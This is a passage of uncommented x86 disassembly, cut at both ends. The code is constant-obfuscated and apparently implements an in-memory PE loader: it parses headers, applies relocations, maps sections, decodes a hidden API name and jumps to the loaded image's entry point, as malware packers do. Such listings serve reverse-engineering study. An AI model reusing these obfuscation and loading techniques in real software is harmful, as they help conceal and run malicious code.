  42713f:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  427146:	mov    eax,DWORD PTR [ebp+0xc]
  427149:	mov    DWORD PTR [ebp+0xc],eax
  42714c:	push   esi
  42714d:	mov    eax,eax
  42714f:	mov    eax,DWORD PTR [ebp-0x4]
  427152:	mov    esi,DWORD PTR [ebp+0x8]
  427155:	mov    ecx,0x75108aa
  42715a:	xor    eax,ecx
  42715c:	mov    edx,0x3272f1
  427161:	add    eax,edx
  427163:	cmp    esi,eax
  427165:	je     0x42728c
  42716b:	mov    eax,DWORD PTR [ebp+0x8]
  42716e:	mov    esi,DWORD PTR [ebp+0x8]
  427171:	add    esi,DWORD PTR [eax+0x3c]
  427174:	push   edi
  427175:	mov    DWORD PTR [ebp+0xc],esi
  427178:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  42717f:	mov    eax,DWORD PTR [ebp-0x1c]
  427182:	mov    esi,DWORD PTR [ebp-0x4]
  427185:	mov    edi,DWORD PTR [ebp+0xc]
  427188:	xor    esi,ecx
  42718a:	xor    eax,ecx
  42718c:	add    esi,edx
  42718e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427195:	je     0x427286
  42719b:	mov    esi,DWORD PTR [ebp+0xc]
  42719e:	mov    eax,DWORD PTR [ebp+0x8]
  4271a1:	add    eax,DWORD PTR [esi+0xa0]
  4271a7:	mov    esi,DWORD PTR [ebp+0x8]
  4271aa:	mov    edi,DWORD PTR [ebp+0xc]
  4271ad:	sub    esi,DWORD PTR [edi+0x34]
  4271b0:	mov    edi,DWORD PTR [ebp-0x4]
  4271b3:	xor    edi,ecx
  4271b5:	add    edi,edx
  4271b7:	mov    DWORD PTR [ebp-0x24],esi
  4271ba:	cmp    esi,edi
  4271bc:	je     0x427286
  4271c2:	mov    esi,DWORD PTR [ebp-0x4]
  4271c5:	xor    esi,ecx
  4271c7:	add    esi,edx
  4271c9:	mov    DWORD PTR [ebp-0x8],esi
  4271cc:	push   ebx
  4271cd:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4271d4:	jmp    0x427270
  4271d9:	mov    esi,DWORD PTR [ebp-0x4]
  4271dc:	xor    esi,ecx
  4271de:	lea    edi,[ebx-0x8]
  4271e1:	add    esi,edx
  4271e3:	shr    edi,1
  4271e5:	cmp    esi,edi
  4271e7:	jae    0x427256
  4271e9:	sub    edi,esi
  4271eb:	lea    ebx,[eax+esi*2+0x8]
  4271ef:	mov    DWORD PTR [ebp-0x18],edi
  4271f2:	movzx  esi,WORD PTR [ebx]
  4271f5:	and    esi,0xfff
  4271fb:	mov    DWORD PTR [ebp-0x14],esi
  4271fe:	mov    edi,DWORD PTR [ebp-0x14]
  427201:	mov    esi,DWORD PTR [eax]
  427203:	sub    esi,edx
  427205:	add    edi,esi
  427207:	movzx  esi,WORD PTR [ebx]
  42720a:	shr    esi,0xc
  42720d:	xor    edi,ecx
  42720f:	mov    DWORD PTR [ebp-0x20],edi
  427212:	mov    DWORD PTR [ebp-0x14],esi
  427215:	mov    esi,DWORD PTR [ebp-0x20]
  427218:	mov    edi,DWORD PTR [ebp+0x8]
  42721b:	xor    esi,ecx
  42721d:	lea    esi,[esi+edi*1+0x3272f1]
  427224:	mov    DWORD PTR [ebp-0x20],esi
  427227:	mov    esi,DWORD PTR [ebp-0x10]
  42722a:	mov    edi,DWORD PTR [ebp-0x14]
  42722d:	xor    esi,ecx
  42722f:	add    esi,edx
  427231:	cmp    edi,esi
  427233:	jne    0x42724b
  427235:	mov    esi,DWORD PTR [ebp-0x10]
  427238:	mov    edi,DWORD PTR [ebp-0x14]
  42723b:	xor    esi,ecx
  42723d:	add    esi,edx
  42723f:	cmp    edi,esi
  427241:	jne    0x42724b
  427243:	mov    esi,DWORD PTR [ebp-0x20]
  427246:	mov    edi,DWORD PTR [ebp-0x24]
  427249:	add    DWORD PTR [esi],edi
  42724b:	add    ebx,0x2
  42724e:	dec    DWORD PTR [ebp-0x18]
  427251:	jne    0x4271f2
  427253:	mov    ebx,DWORD PTR [ebp-0xc]
  427256:	add    DWORD PTR [ebp-0x8],ebx
  427259:	mov    esi,DWORD PTR [ebp-0x1c]
  42725c:	mov    edi,DWORD PTR [ebp-0x8]
  42725f:	mov    ebx,DWORD PTR [ebp+0xc]
  427262:	xor    esi,ecx
  427264:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  42726b:	jae    0x427285
  42726d:	add    eax,DWORD PTR [ebp-0xc]
  427270:	mov    esi,DWORD PTR [ebp-0x4]
  427273:	mov    ebx,DWORD PTR [eax+0x4]
  427276:	xor    esi,ecx
  427278:	add    esi,edx
  42727a:	mov    DWORD PTR [ebp-0xc],ebx
  42727d:	cmp    ebx,esi
  42727f:	jne    0x4271d9
  427285:	pop    ebx
  427286:	mov    eax,DWORD PTR [ebp-0x28]
  427289:	pop    edi
  42728a:	jmp    0x42728f
  42728c:	mov    eax,DWORD PTR [ebp-0x4]
  42728f:	xor    eax,ecx
  427291:	add    eax,edx
  427293:	pop    esi
  427294:	leave  
  427295:	ret    0x8
  427298:	push   ebp
  427299:	mov    ebp,esp
  42729b:	sub    esp,0xd8
  4272a1:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4272a8:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  4272af:	mov    eax,DWORD PTR [ebp-0x4]
  4272b2:	push   ebx
  4272b3:	push   esi
  4272b4:	mov    esi,0x75108aa
  4272b9:	xor    eax,esi
  4272bb:	push   edi
  4272bc:	mov    edi,0x3272f1
  4272c1:	add    eax,edi
  4272c3:	mov    DWORD PTR [ebp-0x18],eax
  4272c6:	mov    eax,DWORD PTR [ebp-0x4]
  4272c9:	xor    eax,esi
  4272cb:	add    eax,edi
  4272cd:	mov    DWORD PTR [ebp-0x8],eax
  4272d0:	mov    ebx,DWORD PTR [ebp+0x20]
  4272d3:	mov    eax,DWORD PTR [ebp-0x1c]
  4272d6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4272d9:	xor    eax,ecx
  4272db:	mov    DWORD PTR [ebp-0x1c],eax
  4272de:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  4272e5:	mov    eax,DWORD PTR [ebp-0xc]
  4272e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4272eb:	xor    eax,ecx
  4272ed:	mov    DWORD PTR [ebp-0xc],eax
  4272f0:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  4272f7:	mov    eax,DWORD PTR [ebp-0x10]
  4272fa:	mov    ecx,DWORD PTR [ebp-0x10]
  4272fd:	xor    eax,ecx
  4272ff:	mov    DWORD PTR [ebp-0x10],eax
  427302:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  427309:	mov    eax,DWORD PTR [ebp-0x28]
  42730c:	mov    ecx,DWORD PTR [ebp-0x28]
  42730f:	xor    eax,ecx
  427311:	mov    DWORD PTR [ebp-0x28],eax
  427314:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  42731b:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427322:	mov    eax,DWORD PTR [ebp+0x8]
  427325:	test   eax,eax
  427327:	je     0x4277b0
  42732d:	mov    eax,DWORD PTR [ebp+0xc]
  427330:	test   eax,eax
  427332:	je     0x4277b0
  427338:	mov    eax,DWORD PTR [ebp+0x18]
  42733b:	test   eax,eax
  42733d:	je     0x4277b0
  427343:	mov    eax,DWORD PTR [ebp+0x20]
  427346:	mov    ecx,DWORD PTR [ebp+0x8]
  427349:	xor    eax,0x8aa
  42734e:	add    eax,0x72f1
  427353:	cmp    WORD PTR [ecx],ax
  427356:	jne    0x4277b0
  42735c:	mov    eax,DWORD PTR [ebp-0x4]
  42735f:	xor    eax,esi
  427361:	add    eax,edi
  427363:	mov    DWORD PTR [ebp-0x30],eax
  427366:	mov    eax,DWORD PTR [ebp-0x4]
  427369:	mov    ecx,DWORD PTR [ebp+0x8]
  42736c:	mov    eax,DWORD PTR [ebp+0x8]
  42736f:	add    eax,DWORD PTR [ecx+0x3c]
  427372:	mov    DWORD PTR [ebp+0xc],eax
  427375:	mov    eax,DWORD PTR [eax+0x50]
  427378:	test   eax,eax
  42737a:	je     0x4277b0
  427380:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427387:	mov    eax,DWORD PTR [ebp-0x2c]
  42738a:	xor    eax,esi
  42738c:	add    eax,edi
  42738e:	mov    DWORD PTR [ebp-0x2c],eax
  427391:	mov    eax,DWORD PTR [ebp-0x4]
  427394:	mov    eax,DWORD PTR [ebx+0x190]
  42739a:	mov    ecx,DWORD PTR [eax]
  42739c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42739f:	add    ecx,DWORD PTR [eax]
  4273a1:	mov    eax,DWORD PTR [ebp-0x4]
  4273a4:	mov    eax,DWORD PTR [ebx+0x18c]
  4273aa:	mov    edx,DWORD PTR [eax]
  4273ac:	mov    DWORD PTR [ebp-0x20],ecx
  4273af:	mov    DWORD PTR [ebp+0x20],edx
  4273b2:	cmp    edx,edx
  4273b4:	jne    0x4273e8
  4273b6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4273bc:	lea    edx,[ebp-0x18]
  4273bf:	push   edx
  4273c0:	mov    edx,DWORD PTR [ebp-0xc]
  4273c3:	xor    edx,esi
  4273c5:	add    edx,edi
  4273c7:	push   edx
  4273c8:	push   DWORD PTR [ecx+0x50]
  4273cb:	push   DWORD PTR [ebp+0x20]
  4273ce:	call   DWORD PTR [eax+0x1c]
  4273d1:	mov    eax,DWORD PTR [ebp-0x20]
  4273d4:	mov    ecx,DWORD PTR [eax+0x54]
  4273d7:	mov    eax,DWORD PTR [eax+0x50]
  4273da:	sub    eax,ecx
  4273dc:	add    ecx,DWORD PTR [ebp+0x20]
  4273df:	push   ecx
  4273e0:	call   0x427d4b
  4273e5:	mov    edx,DWORD PTR [ebp+0x20]
  4273e8:	mov    eax,DWORD PTR [ebx+0x194]
  4273ee:	mov    DWORD PTR [eax],edx
  4273f0:	mov    eax,DWORD PTR [ebp+0xc]
  4273f3:	push   DWORD PTR [eax+0x54]
  4273f6:	push   DWORD PTR [ebp+0x8]
  4273f9:	push   edx
  4273fa:	call   0x427c41
  4273ff:	mov    ecx,DWORD PTR [ebp+0x20]
  427402:	mov    eax,DWORD PTR [ecx+0x3c]
  427405:	add    eax,ecx
  427407:	movzx  ecx,WORD PTR [eax+0x14]
  42740b:	lea    ecx,[ecx+eax*1+0x18]
  42740f:	mov    DWORD PTR [ebp+0x18],ecx
  427412:	mov    ecx,DWORD PTR [ebp-0x4]
  427415:	movzx  edx,WORD PTR [eax+0x6]
  427419:	xor    ecx,esi
  42741b:	add    ecx,edi
  42741d:	mov    DWORD PTR [ebp+0xc],eax
  427420:	cmp    edx,ecx
  427422:	je     0x4274cf
  427428:	mov    ecx,DWORD PTR [ebp-0x4]
  42742b:	xor    ecx,esi
  42742d:	add    ecx,edi
  42742f:	mov    DWORD PTR [ebp-0x8],ecx
  427432:	mov    ecx,DWORD PTR [ebp-0x24]
  427435:	movzx  edx,WORD PTR [eax+0x6]
  427439:	xor    ecx,esi
  42743b:	sub    edx,ecx
  42743d:	sub    edx,edi
  42743f:	cmp    DWORD PTR [ebp-0x8],edx
  427442:	ja     0x4274cf
  427448:	mov    edx,DWORD PTR [ebp+0x18]
  42744b:	add    edx,0x8
  42744e:	mov    DWORD PTR [ebp+0x18],edx
  427451:	jmp    0x427456
  427453:	mov    edx,DWORD PTR [ebp+0x18]
  427456:	mov    eax,DWORD PTR [eax+0x38]
  427459:	lea    ecx,[eax-0x1]
  42745c:	mov    DWORD PTR [ebp-0x38],eax
  42745f:	mov    eax,DWORD PTR [edx]
  427461:	test   eax,ecx
  427463:	je     0x42746c
  427465:	not    ecx
  427467:	and    eax,ecx
  427469:	add    eax,DWORD PTR [ebp-0x38]
  42746c:	mov    ecx,DWORD PTR [edx+0x4]
  42746f:	add    ecx,DWORD PTR [ebp+0x20]
  427472:	push   ecx
  427473:	call   0x427d4b
  427478:	mov    edx,DWORD PTR [ebp-0x4]
  42747b:	mov    eax,DWORD PTR [ebp+0x18]
  42747e:	mov    ecx,DWORD PTR [eax+0x8]
  427481:	xor    edx,esi
  427483:	add    edx,edi
  427485:	cmp    ecx,edx
  427487:	je     0x4274a0
  427489:	push   ecx
  42748a:	mov    ecx,DWORD PTR [ebp+0x8]
  42748d:	add    ecx,DWORD PTR [eax+0xc]
  427490:	mov    eax,DWORD PTR [eax+0x4]
  427493:	add    eax,DWORD PTR [ebp+0x20]
  427496:	push   ecx
  427497:	push   eax
  427498:	call   0x427c41
  42749d:	mov    eax,DWORD PTR [ebp+0x18]
  4274a0:	mov    ecx,DWORD PTR [ebp-0x24]
  4274a3:	mov    edx,DWORD PTR [ebp-0x8]
  4274a6:	add    eax,0x28
  4274a9:	xor    ecx,esi
  4274ab:	lea    ecx,[edx+ecx*1+0x3272f1]
  4274b2:	mov    edx,DWORD PTR [ebp+0xc]
  4274b5:	mov    DWORD PTR [ebp+0x18],eax
  4274b8:	mov    eax,DWORD PTR [ebp-0x24]
  4274bb:	movzx  edx,WORD PTR [edx+0x6]
  4274bf:	xor    eax,esi
  4274c1:	sub    edx,eax
  4274c3:	mov    eax,DWORD PTR [ebp+0xc]
  4274c6:	sub    edx,edi
  4274c8:	mov    DWORD PTR [ebp-0x8],ecx
  4274cb:	cmp    ecx,edx
  4274cd:	jbe    0x427453
  4274cf:	mov    edx,DWORD PTR [ebx+0x18c]
  4274d5:	mov    ecx,DWORD PTR [ebp+0x20]
  4274d8:	cmp    ecx,DWORD PTR [edx]
  4274da:	jne    0x427503
  4274dc:	mov    eax,DWORD PTR [ebx+0x1e0]
  4274e2:	lea    edx,[ebp-0x18]
  4274e5:	push   edx
  4274e6:	mov    edx,DWORD PTR [ebp-0x10]
  4274e9:	xor    edx,esi
  4274eb:	add    edx,edi
  4274ed:	push   edx
  4274ee:	mov    edx,DWORD PTR [ebp-0x20]
  4274f1:	push   DWORD PTR [edx+0x54]
  4274f4:	push   ecx
  4274f5:	call   DWORD PTR [eax+0x1c]
  4274f8:	test   eax,eax
  4274fa:	je     0x4277a1
  427500:	mov    eax,DWORD PTR [ebp+0xc]
  427503:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427509:	mov    ecx,DWORD PTR [ecx]
  42750b:	xor    ecx,esi
  42750d:	add    ecx,edi
  42750f:	je     0x4276cc
  427515:	mov    eax,DWORD PTR [ebp-0x4]
  427518:	xor    eax,esi
  42751a:	add    eax,edi
  42751c:	and    DWORD PTR [ebp+0x8],0x0
  427520:	mov    DWORD PTR [ebp-0x14],eax
  427523:	mov    eax,0xf89c85d9
  427528:	lea    ecx,[eax-0x8]
  42752b:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427532:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  427539:	mov    DWORD PTR [ebp-0x50],eax
  42753c:	mov    DWORD PTR [ebp-0x4c],ecx
  42753f:	mov    DWORD PTR [ebp-0x48],ecx
  427542:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427549:	mov    edx,DWORD PTR [ebp+0x8]
  42754c:	mov    ecx,0x8aa
  427551:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427556:	mov    edx,0x72f1
  42755b:	add    cx,dx
  42755e:	mov    edx,DWORD PTR [ebp+0x8]
  427561:	inc    DWORD PTR [ebp+0x8]
  427564:	cmp    DWORD PTR [ebp+0x8],0x6
  427568:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427570:	jb     0x427549
  427572:	mov    ecx,0xf89c852b
  427577:	mov    DWORD PTR [ebp-0xb0],eax
  42757d:	mov    DWORD PTR [ebp-0x9c],eax
  427583:	mov    DWORD PTR [ebp-0x74],eax
  427586:	mov    DWORD PTR [ebp-0x70],eax
  427589:	lea    eax,[ecx-0x3]
  42758c:	mov    edx,0xf89c85ff
  427591:	mov    DWORD PTR [ebp-0x64],eax
  427594:	mov    DWORD PTR [ebp-0x60],eax
  427597:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  4275a1:	mov    DWORD PTR [ebp-0xac],ecx
  4275a7:	mov    DWORD PTR [ebp-0xa8],edx
  4275ad:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  4275b7:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  4275c1:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  4275cb:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  4275d5:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  4275df:	mov    DWORD PTR [ebp-0x8c],ecx
  4275e5:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  4275ef:	mov    DWORD PTR [ebp-0x84],edx
  4275f5:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  4275fc:	mov    DWORD PTR [ebp-0x7c],ecx
  4275ff:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  427606:	mov    DWORD PTR [ebp-0x6c],ecx
  427609:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427610:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427617:	xor    eax,eax
  427619:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427620:	xor    cl,0xaa
  427623:	sub    cl,0xf
  427626:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  42762d:	inc    eax
  42762e:	cmp    eax,0x17
  427631:	jb     0x427619
  427633:	mov    eax,DWORD PTR [ebx+0x1e0]
  427639:	lea    ecx,[ebp-0xc0]
  42763f:	push   ecx
  427640:	call   DWORD PTR [eax+0x4]
  427643:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427649:	lea    edx,[ebp-0xd8]
  42764f:	push   edx
  427650:	push   eax
  427651:	call   DWORD PTR [ecx+0x8]
  427654:	mov    DWORD PTR [ebp-0x40],eax
  427657:	lea    eax,[ebp-0x14]
  42765a:	push   eax
  42765b:	mov    eax,DWORD PTR [ebx+0x18c]
  427661:	push   DWORD PTR [eax]
  427663:	mov    eax,DWORD PTR [ebp-0x40]
  427666:	call   eax
  427668:	mov    eax,DWORD PTR [ebp-0x4]
  42766b:	xor    eax,esi
  42766d:	add    eax,edi
  42766f:	mov    DWORD PTR [ebp-0x34],eax
  427672:	mov    ecx,DWORD PTR [ebp-0x4]
  427675:	mov    eax,DWORD PTR [ebp-0x14]
  427678:	xor    ecx,esi
  42767a:	add    ecx,edi
  42767c:	cmp    eax,ecx
  42767e:	je     0x4276c9
  427680:	mov    DWORD PTR [ebp-0x3c],eax
  427683:	jmp    0x427694
  427685:	mov    eax,DWORD PTR [eax]
  427687:	mov    ecx,DWORD PTR [ebp-0x3c]
  42768a:	mov    DWORD PTR [ebp-0x14],eax
  42768d:	mov    eax,DWORD PTR [ebp-0x14]
  427690:	cmp    eax,ecx
  427692:	je     0x4276a1
  427694:	mov    edx,DWORD PTR [eax+0x18]
  427697:	mov    ecx,DWORD PTR [ebx+0x18c]
  42769d:	cmp    edx,DWORD PTR [ecx]
  42769f:	jne    0x427685
  4276a1:	mov    ecx,DWORD PTR [ebx+0x18c]
  4276a7:	mov    edx,DWORD PTR [eax+0x18]
  4276aa:	cmp    edx,DWORD PTR [ecx]
  4276ac:	jne    0x4276c9
  4276ae:	mov    ecx,DWORD PTR [ebx+0x190]
  4276b4:	mov    edx,DWORD PTR [ebp-0x20]
  4276b7:	mov    edx,DWORD PTR [edx+0x28]
  4276ba:	add    edx,DWORD PTR [ecx]
  4276bc:	mov    DWORD PTR [eax+0x1c],edx
  4276bf:	mov    eax,DWORD PTR [ebp-0x24]
  4276c2:	xor    eax,esi
  4276c4:	add    eax,edi
  4276c6:	mov    DWORD PTR [ebp-0x34],eax
  4276c9:	mov    eax,DWORD PTR [ebp+0xc]
  4276cc:	push   ebx
  4276cd:	push   eax
  4276ce:	push   DWORD PTR [ebp+0x20]
  4276d1:	call   0x426e4f
  4276d6:	test   eax,eax
  4276d8:	je     0x4277a1
  4276de:	push   DWORD PTR [ebp+0xc]
  4276e1:	mov    ecx,ebx
  4276e3:	push   DWORD PTR [ebp+0x20]
  4276e6:	call   0x426da8
  4276eb:	test   eax,eax
  4276ed:	je     0x4277a1
  4276f3:	mov    eax,DWORD PTR [ebp+0xc]
  4276f6:	mov    edx,DWORD PTR [ebp+0x20]
  4276f9:	mov    ecx,ebx
  4276fb:	call   0x426c81
  427700:	test   eax,eax
  427702:	je     0x4277a1
  427708:	push   ebx
  427709:	push   DWORD PTR [ebp+0x20]
  42770c:	call   0x427132
  427711:	test   eax,eax
  427713:	je     0x4277a1
  427719:	mov    eax,DWORD PTR [ebx+0x18c]
  42771f:	mov    edx,DWORD PTR [ebp+0x20]
  427722:	cmp    edx,DWORD PTR [eax]
  427724:	jne    0x427740
  427726:	mov    eax,DWORD PTR [ebx+0x1e0]
  42772c:	lea    ecx,[ebp-0x18]
  42772f:	push   ecx
  427730:	push   DWORD PTR [ebp-0x18]
  427733:	mov    ecx,DWORD PTR [ebp-0x20]
  427736:	push   DWORD PTR [ecx+0x54]
  427739:	push   edx
  42773a:	call   DWORD PTR [eax+0x1c]
  42773d:	mov    edx,DWORD PTR [ebp+0x20]
  427740:	mov    eax,DWORD PTR [ebx+0x1c8]
  427746:	mov    eax,DWORD PTR [eax]
  427748:	xor    eax,esi
  42774a:	add    eax,edi
  42774c:	je     0x427785
  42774e:	mov    ecx,DWORD PTR [ebp+0xc]
  427751:	mov    eax,DWORD PTR [ecx+0x28]
  427754:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  42775b:	mov    esi,DWORD PTR [ebp+0x8]
  42775e:	push   DWORD PTR [ebp+0x14]
  427761:	xor    esi,0x8aa
  427767:	push   DWORD PTR [ebp+0x10]
  42776a:	add    esi,0x72f1
  427770:	or     WORD PTR [ecx+0x16],si
  427774:	add    eax,edx
  427776:	push   edx
  427777:	call   eax
  427779:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427783:	jmp    0x42778f
  427785:	mov    eax,DWORD PTR [ebp+0xc]
  427788:	mov    eax,DWORD PTR [eax+0x28]
  42778b:	add    eax,edx
  42778d:	call   eax
  42778f:	mov    DWORD PTR [ebp-0x8],eax
  427792:	mov    eax,DWORD PTR [ebp-0x8]
  427795:	mov    ecx,DWORD PTR [ebp+0x1c]
  427798:	mov    DWORD PTR [ecx],eax
  42779a:	mov    DWORD PTR [ebp-0x30],0x1
  4277a1:	cmp    DWORD PTR [ebp-0x30],0x0
  4277a5:	jne    0x4277ab
  4277a7:	and    DWORD PTR [ebp+0x20],0x0
  4277ab:	mov    eax,DWORD PTR [ebp+0x20]
  4277ae:	jmp    0x4277b2
  4277b0:	xor    eax,eax
  4277b2:	pop    edi
  4277b3:	pop    esi
  4277b4:	pop    ebx
  4277b5:	leave  
  4277b6:	ret    0x1c
  4277b9:	push   ebp
  4277ba:	mov    ebp,esp
  4277bc:	movzx  edx,WORD PTR [ecx+0x6]
  4277c0:	movzx  eax,WORD PTR [ecx+0x14]
  4277c4:	push   ebx
  4277c5:	push   edi
  4277c6:	xor    edi,edi
  4277c8:	lea    eax,[eax+ecx*1+0x18]
  4277cc:	test   edx,edx
  4277ce:	je     0x4277ef
  4277d0:	mov    ecx,DWORD PTR [eax+0xc]
  4277d3:	lea    ebx,[ecx+esi*1]
  4277d6:	cmp    DWORD PTR [ebp+0x8],ebx
  4277d9:	jb     0x4277e7
  4277db:	mov    ebx,DWORD PTR [eax+0x8]
  4277de:	add    ebx,ecx
  4277e0:	add    ebx,esi
  4277e2:	cmp    DWORD PTR [ebp+0x8],ebx
  4277e5:	jb     0x4277f1
  4277e7:	add    eax,0x28
  4277ea:	inc    edi
  4277eb:	cmp    edi,edx
  4277ed:	jb     0x4277d0
  4277ef:	xor    eax,eax
  4277f1:	pop    edi
  4277f2:	pop    ebx
  4277f3:	pop    ebp
  4277f4:	ret    0x4
  4277f7:	push   ebp
  4277f8:	mov    ebp,esp
  4277fa:	sub    esp,0x34
  4277fd:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427804:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  42780b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  427812:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  427819:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  427820:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  427827:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  42782e:	mov    DWORD PTR [ebp-0x10],eax
  427831:	mov    eax,DWORD PTR [ebp+0x8]
  427834:	mov    DWORD PTR [ebp-0x14],eax
  427837:	mov    eax,DWORD PTR [ebp-0xc]
  42783a:	push   ebx
  42783b:	mov    ecx,0x75108aa
  427840:	xor    eax,ecx
  427842:	push   esi
  427843:	mov    esi,DWORD PTR [ebp-0x10]
  427846:	mov    edx,0x3272f1
  42784b:	add    eax,edx
  42784d:	push   edi
  42784e:	cmp    esi,eax
  427850:	je     0x427a2f
  427856:	mov    eax,DWORD PTR [ebp-0xc]
  427859:	mov    esi,DWORD PTR [ebp-0x14]
  42785c:	xor    eax,ecx
  42785e:	add    eax,edx
  427860:	cmp    esi,eax
  427862:	je     0x427a2f
  427868:	mov    eax,DWORD PTR [ebp-0xc]
  42786b:	xor    eax,ecx
  42786d:	add    eax,edx
  42786f:	mov    DWORD PTR [ebp-0x24],eax
  427872:	mov    eax,DWORD PTR [ebp-0xc]
  427875:	xor    eax,ecx
  427877:	add    eax,edx
  427879:	mov    DWORD PTR [ebp-0x28],eax
  42787c:	mov    edi,DWORD PTR [ebp-0x20]
  42787f:	mov    ebx,DWORD PTR [ebp-0x8]
  427882:	mov    esi,0x8aa
  427887:	xor    edi,esi
  427889:	mov    eax,0x72f1
  42788e:	xor    ebx,esi
  427890:	add    edi,eax
  427892:	add    ebx,eax
  427894:	sub    ebx,edi
  427896:	mov    WORD PTR [ebp-0x8],bx
  42789a:	jmp    0x42795f
  42789f:	mov    edi,DWORD PTR [ebp-0xc]
  4278a2:	mov    bx,WORD PTR [ebp-0x4]
  4278a6:	xor    edi,esi
  4278a8:	add    edi,eax
  4278aa:	cmp    bx,di
  4278ad:	je     0x4279a1
  4278b3:	mov    edi,DWORD PTR [ebp-0xc]
  4278b6:	mov    ebx,DWORD PTR [ebp+0xc]
  4278b9:	xor    edi,ecx
  4278bb:	add    edi,edx
  4278bd:	cmp    ebx,edi
  4278bf:	mov    di,WORD PTR [ebp-0x4]
  4278c3:	mov    bx,WORD PTR [ebp+0x8]
  4278c7:	je     0x427932
  4278c9:	cmp    bx,di
  4278cc:	je     0x42793b
  4278ce:	mov    edi,DWORD PTR [ebp-0x20]
  4278d1:	mov    bx,WORD PTR [ebp+0x8]
  4278d5:	xor    edi,esi
  4278d7:	add    edi,eax
  4278d9:	cmp    bx,di
  4278dc:	jb     0x4278fc
  4278de:	mov    edi,DWORD PTR [ebp-0x2c]
  4278e1:	mov    bx,WORD PTR [ebp+0x8]
  4278e5:	xor    edi,esi
  4278e7:	add    edi,eax
  4278e9:	cmp    bx,di
  4278ec:	ja     0x4278fc
  4278ee:	movzx  edi,WORD PTR [ebp+0x8]
  4278f2:	movzx  ebx,WORD PTR [ebp-0x8]
  4278f6:	add    edi,ebx
  4278f8:	mov    WORD PTR [ebp+0x8],di
  4278fc:	mov    edi,DWORD PTR [ebp-0x20]
  4278ff:	mov    bx,WORD PTR [ebp-0x4]
  427903:	xor    edi,esi
  427905:	add    edi,eax
  427907:	cmp    bx,di
  42790a:	jb     0x42792a
  42790c:	mov    edi,DWORD PTR [ebp-0x2c]
  42790f:	mov    bx,WORD PTR [ebp-0x4]
  427913:	xor    edi,esi
  427915:	add    edi,eax
  427917:	cmp    bx,di
  42791a:	ja     0x42792a
  42791c:	movzx  edi,WORD PTR [ebp-0x4]
  427920:	movzx  ebx,WORD PTR [ebp-0x8]
  427924:	add    edi,ebx
  427926:	mov    WORD PTR [ebp-0x4],di
  42792a:	mov    di,WORD PTR [ebp-0x4]
  42792e:	mov    bx,WORD PTR [ebp+0x8]
  427932:	cmp    bx,di
  427935:	jne    0x427a2f
  42793b:	mov    edi,DWORD PTR [ebp-0x1c]
  42793e:	mov    ebx,DWORD PTR [ebp-0x10]
  427941:	xor    edi,ecx
  427943:	lea    edi,[edi+ebx*1+0x3272f1]
  42794a:	mov    DWORD PTR [ebp-0x10],edi
  42794d:	mov    edi,DWORD PTR [ebp-0x1c]
  427950:	mov    ebx,DWORD PTR [ebp-0x14]
  427953:	xor    edi,ecx
  427955:	lea    edi,[edi+ebx*1+0x3272f1]
  42795c:	mov    DWORD PTR [ebp-0x14],edi
  42795f:	mov    edi,DWORD PTR [ebp-0x24]
  427962:	mov    ebx,DWORD PTR [ebp-0x10]
  427965:	mov    di,WORD PTR [ebx+edi*2]
  427969:	mov    WORD PTR [ebp+0x8],di
  42796d:	mov    edi,DWORD PTR [ebp-0x28]
  427970:	mov    ebx,DWORD PTR [ebp-0x14]
  427973:	mov    di,WORD PTR [ebx+edi*2]
  427977:	mov    WORD PTR [ebp-0x4],di
  42797b:	mov    edi,DWORD PTR [ebp-0xc]
  42797e:	mov    bx,WORD PTR [ebp+0x8]
  427982:	xor    edi,esi
  427984:	add    edi,eax
  427986:	cmp    bx,di
  427989:	jne    0x42789f
  42798f:	mov    eax,DWORD PTR [ebp-0x18]
  427992:	mov    esi,DWORD PTR [ebp-0xc]
  427995:	xor    eax,ecx
  427997:	add    eax,edx
  427999:	imul   eax,esi
  42799c:	mov    DWORD PTR [ebp-0xc],eax
  42799f:	jmp    0x4279b3
  4279a1:	mov    eax,DWORD PTR [ebp-0xc]
  4279a4:	mov    esi,DWORD PTR [ebp-0x18]
  4279a7:	xor    eax,ecx
